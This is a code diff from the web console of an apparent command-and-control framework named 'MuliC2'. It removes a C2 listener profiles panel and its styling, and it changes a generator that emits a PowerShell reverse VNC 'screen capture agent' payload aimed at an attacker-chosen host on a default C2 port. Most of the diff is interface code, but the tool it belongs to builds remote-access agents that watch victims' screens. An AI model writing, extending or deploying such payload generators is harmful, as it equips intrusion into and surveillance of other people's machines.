@@ -254,51 +254,7 @@
         </div>
       </el-tab-pane>
 
-      <!-- Profiles Panel -->
-      <el-tab-pane label="Profiles" name="profiles">
-        <div class="profiles-panel">
-          <div class="panel-header">
-            <h3>C2 Listener Profiles</h3>
-            <el-button type="primary" size="small" @click="loadProfiles">
-              <el-icon><Refresh /></el-icon>
-              Refresh
-            </el-button>
-          </div>
-          
-          <div v-if="availableProfiles.length === 0" class="empty-state">
-            <el-icon size="64" color="#909399"><Connection /></el-icon>
-            <h3>No Profiles Available</h3>
-            <p>No C2 listener profiles found. Please check:</p>
-            <ul>
-              <li>Backend server is running</li>
-              <li>Profiles are configured in backend/config.json</li>
-              <li>API endpoint /api/profile/list is accessible</li>
-            </ul>
-          </div>
-          
-          <el-table v-else :data="availableProfiles" style="width: 100%" class="profiles-table">
-            <el-table-column prop="name" label="Profile Name" width="200" />
-            <el-table-column prop="host" label="Host" width="120" />
-            <el-table-column prop="port" label="Port" width="80" />
-            <el-table-column prop="useTLS" label="TLS" width="80">
-              <template #default="scope">
-                <el-tag :type="scope.row.useTLS ? 'success' : 'warning'">
-                  {{ scope.row.useTLS ? 'Yes' : 'No' }}
-                </el-tag>
-              </template>
-            </el-table-column>
-            <el-table-column prop="pollInterval" label="Poll Interval" width="120" />
-            <el-table-column prop="isActive" label="Status" width="100">
-              <template #default="scope">
-                <el-tag :type="scope.row.isActive ? 'success' : 'danger'">
-                  {{ scope.row.isActive ? 'Active' : 'Inactive' }}
-                </el-tag>
-              </template>
-            </el-table-column>
-            <el-table-column prop="createdAt" label="Created" width="180" />
-          </el-table>
-        </div>
-      </el-tab-pane>
+
 
       <!-- VNC Panel - Reverse VNC Payload Generator -->
       <el-tab-pane label="VNC" name="vnc">
@@ -892,27 +848,24 @@ const generateVncPayload = async () => {
   generatingVnc.value = true
   
   try {
-    // Get available profiles for TLS configuration
-    const profiles = availableProfiles.value.filter(p => p.isActive && p.useTLS)
-    if (profiles.length === 0) {
-      ElMessage.warning('No active TLS profiles found. VNC payload will use basic connection.')
-    }
+    // Use the LHOST as the C2 server and a default C2 port
+    const c2Host = vncForm.value.lhost
+    const c2Port = 8443 // Default C2 port from config
+    const vncPort = vncForm.value.lport
     
-    // Select the first active TLS profile or use default
-    const selectedProfile = profiles[0] || { port: 8443, useTLS: true }
+    console.log('VNC Configuration:', { c2Host, c2Port, vncPort })
     
     let payload = `# MuliC2 VNC Screen Capture Agent
-# C2 Profile: ${selectedProfile.name || 'Default TLS Profile'}
-# C2 Host: ${vncForm.value.lhost}
-# C2 Port: ${selectedProfile.port}
-# VNC Target: ${vncForm.value.lhost}:${vncForm.value.lport}
+# C2 Host: ${c2Host}
+# C2 Port: ${c2Port}
+# VNC Target: ${c2Host}:${vncPort}
 # Type: ${vncForm.value.payloadType}
 # Loader: ${vncForm.value.useLoader ? 'Enabled' : 'Disabled'}
 # Generated: ${new Date().toLocaleString()}
 
 param(
-    [string]\$C2Host = "${vncForm.value.lhost}",
-    [int]\$C2Port = ${selectedProfile.port}
+    [string]\$C2Host = "${c2Host}",
+    [int]\$C2Port = ${c2Port}
 )
 
 # Add required assemblies with error handling
@@ -1797,101 +1750,7 @@ const loadDashboardData = async () => {
   margin-top: 15px;
 }
 
-/* Profiles Panel */
-.profiles-panel {
-  padding: 20px;
-}
 
-.profiles-panel .panel-header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 20px;
-}
-
-.profiles-panel .panel-header h3 {
-  margin: 0;
-  color: var(--text-white);
-}
-
-.profiles-panel .empty-state {
-  text-align: center;
-  padding: 40px;
-  color: var(--text-gray);
-}
-
-.profiles-panel .empty-state h3 {
-  margin: 20px 0 10px 0;
-  color: var(--text-white);
-}
-
-.profiles-panel .empty-state ul {
-  text-align: left;
-  max-width: 400px;
-  margin: 20px auto;
-  padding-left: 20px;
-}
-
-.profiles-panel .empty-state li {
-  margin: 5px 0;
-}
-
-/* Profile table styling */
-.profiles-panel .profiles-table {
-  margin-top: 15px;
-}
-
-/* Fix table text color for better readability */
-:deep(.profiles-table .el-table) {
-  background: var(--secondary-black) !important;
-  color: var(--text-white) !important;
-}
-
-:deep(.profiles-table .el-table th) {
-  background: var(--primary-black) !important;
-  color: var(--text-white) !important;
-  border-bottom: 1px solid var(--border-color) !important;
-}
-
-:deep(.profiles-table .el-table td) {
-  background: var(--secondary-black) !important;
-  color: var(--text-white) !important;
-  border-bottom: 1px solid var(--border-color) !important;
-}
-
-:deep(.profiles-table .el-table tr:hover td) {
-  background: var(--primary-black) !important;
-  color: var(--text-white) !important;
-}
-
-:deep(.profiles-table .el-table--striped .el-table__body tr.el-table__row--striped td) {
-  background: var(--primary-black) !important;
-  color: var(--text-white) !important;
-}
-
-/* Additional table styling for better visibility */
-:deep(.profiles-table .el-table__body tr) {
-  background: var(--secondary-black) !important;
-}
-
-:deep(.profiles-table .el-table__body tr:hover) {
-  background: var(--primary-black) !important;
-}
-
-:deep(.profiles-table .el-table__body td) {
-  color: var(--text-white) !important;
-  background: var(--secondary-black) !important;
-}
-
-:deep(.profiles-table .el-table__body tr:hover td) {
-  color: var(--text-white) !important;
-  background: var(--primary-black) !important;
-}
-
-:deep(.profiles-table .el-table__header th) {
-  color: var(--text-white) !important;
-  background: var(--primary-black) !important;
-}
 
 /* VNC Panel */
 .vnc-panel {
